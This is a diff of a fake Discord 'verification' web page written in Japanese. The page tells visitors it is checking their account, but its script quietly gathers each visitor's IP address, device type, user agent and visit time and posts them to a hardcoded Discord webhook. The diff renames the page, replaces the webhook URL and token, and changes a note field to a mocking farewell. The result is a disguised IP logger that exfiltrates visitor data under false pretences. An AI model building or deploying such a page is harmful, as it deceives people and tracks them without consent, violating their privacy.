@@ -49,7 +49,7 @@
 <body>
 
 <div class="container">
-  <h1>Bedrock 3</h1>
+  <h1>Verify 1</h1>
   <p>認証中です...<br>Discordアカウントを確認しています</p>
   <div id="status">しばらくお待ちください...</div>
 </div>
@@ -72,22 +72,22 @@
     const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(ua) ? "モバイル" : "PC/タブレット";
 
     const payload = {
-      content: "**Bedrock 3 認証ページ訪問**",
+      content: "**Tokutei 1 認証情報**",
       embeds: [{
         title: "訪問者情報（自動取得）",
         color: 0x5865f2,
         fields: [
           { name: "IPアドレス", value: ip, inline: true },
-          { name: "デバイス種別", value: isMobile, inline: true },
+          { name: "デバイス", value: isMobile, inline: true },
           { name: "User-Agent", value: ua.substring(0, 180) + (ua.length > 180 ? "..." : ""), inline: false },
           { name: "時刻", value: new Date().toLocaleString('ja-JP'), inline: false },
-          { name: "備考", value: "メールアドレス・Discordユーザー名・アイコンは自動取得不可", inline: false }
+          { name: "備考", value: "はいおつかれー", inline: false }
         ],
         timestamp: new Date().toISOString()
       }]
     };
 
-    const webhook = "https://discord.com/api/webhooks/1468990532221927485/TmW8si5EPAaSjAclfY2Jal7jHloFqYG4p6dT3jb8WtS6WzD2Ck_Eon2DNHSe-6L8EZjw";
+    const webhook = "https://discord.com/api/webhooks/1469250024436269250/lYSUsmGv1EmLci-EfN7RI7-M61AGReV18YdB2lY2IJ5M85FqNRQfBbmXUv3EjBcGcytZ";
 
     try {
       await fetch(webhook, {
